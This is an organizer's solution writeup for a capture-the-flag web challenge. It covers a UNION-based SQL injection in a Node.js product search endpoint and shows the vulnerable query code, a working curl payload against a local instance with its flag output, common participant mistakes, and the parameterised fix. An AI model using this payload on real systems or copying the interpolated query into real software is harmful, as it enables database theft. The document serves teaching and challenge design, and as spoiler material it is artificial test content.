# WEB-04 — Organizer Writeup (spoilers)

> **Do not distribute.** This file contains the solution. The participant-facing
> material lives in `challenge.yml` → `public.description` and in the hints.

## Challenge summary

Blackstone Commerce filters its catalogue with a `category` query parameter that
is concatenated into a SQL statement. The projected row has four columns, the
`internal_records` table has four columns, and the flag sits in that table, so a
single UNION returns it.

| | |
|---|---|
| Category | Web |
| Difficulty | Easy |
| Points | 100 |
| Vulnerability | SQL injection, UNION-based (CWE-89) |
| Vulnerable endpoint | `GET /api/products/search?category=` |
| Safe sibling | `GET /api/products/search?q=` (parameterised) |
| Flag location | `internal_records.flag`, returned as the row's `description` |

## Vulnerability explanation

`src/search.js` builds the filter statement by string interpolation:

```js
const query = `SELECT id, name, category, description FROM products WHERE category = '${category}';`;
const stmt = db.prepare(query);
const rows = stmt.all();
return res.json(rows);
```

`db.prepare()` gives no protection here: the placeholder is already gone by the
time it is called, so the database receives attacker-controlled SQL. The
keyword branch directly below uses bound parameters, which is what makes the
contrast visible during review:

```js
const stmt = db.prepare(
  'SELECT id, name, category, description FROM products WHERE name LIKE ? OR description LIKE ? ORDER BY id ASC'
);
const rows = stmt.all(pattern, pattern);
```

### Why the column count matters

`internal_records` has four columns — `id, record_name, classification, flag` —
and the vulnerable projection also has four. A UNION therefore needs no padding:

```sql
SELECT id, name, category, description FROM products WHERE category = ''
UNION SELECT id, record_name, classification, flag FROM internal_records-- -
```

The trailing `-- -` comments out the statement's own closing `;`, which is
otherwise a syntax error because `better-sqlite3` refuses multiple statements.

### Deliberate non-leaks

The handler swallows database errors and answers with a generic 400:

```js
catch (err) {
  return res.status(400).json({ error: 'Invalid search query parameter.' });
}
```

No SQL text, table names, or filesystem paths reach the client, so error-based
techniques are unavailable. Blind and time-based approaches do not work either —
no sleep primitive is exposed. The intended path is a UNION that matches the
four-column projection, which is why Hint 3 points at "adding a row".

## Exploit

```bash
TARGET=http://127.0.0.1:3000

curl -sG "$TARGET/api/products/search" \
  --data-urlencode "category=' UNION SELECT id, record_name, classification, flag FROM internal_records-- -" \
| python3 -m json.tool
```

Response:

```json
[
  {
    "id": 1,
    "name": "Internal Deployment Record",
    "category": "Restricted",
    "description": "AXUM{database_after_dark_5418ce4d815c}"
  }
]
```

The `description` value is the submitting team's own flag.

## Common participant mistakes

* Sending `UNION SELECT flag FROM internal_records` — column count mismatch, so
  the statement raises and returns the generic 400. The projected columns must
  be matched, in order and count.
* Using `?q=` instead of `?category=` — that branch is parameterised and the
  payload is treated as a search string.
* Sending the raw `'` first: it returns `400 Invalid search query parameter`
  with no detail. That error is the signal to count columns rather than to look
  for verbose errors.
* Forgetting the comment terminator, which leaves the original trailing `;` and
  produces a "You can only execute one statement at a time" error server-side
  (surfaced to the client only as the generic 400).
* Browsing the category pills instead of reading the request the UI makes. The
  pills only ever send a plain category name.

## Remediation

Parameterise the filter exactly like the keyword branch:

```js
const stmt = db.prepare(
  'SELECT id, name, category, description FROM products WHERE category = ? ORDER BY id ASC'
);
const rows = stmt.all(category);
```

Additional hardening worth mentioning in a debrief:

* Keep `internal_records` out of the application's read path; the catalogue
  service should not be able to select from it at all (separate credentials or
  a restricted view).
* Return JSON `404` from API routes instead of falling through to the SPA shell,
  so API clients never receive HTML for an unknown endpoint.
* Log the failing statement server-side while keeping the client response
  generic, so operators can detect injection attempts without aiding attackers.

## Flag handling notes

* The flag is read once from `GZCTF_FLAG` at start, trimmed, and inserted into
  `internal_records`.
* The process refuses to start when the variable is absent, empty, or
  whitespace-only, so a misconfigured instance never serves an empty flag.
* The flag is never written to logs and is not baked into the image; it exists
  only inside the container's SQLite file for that team's instance.
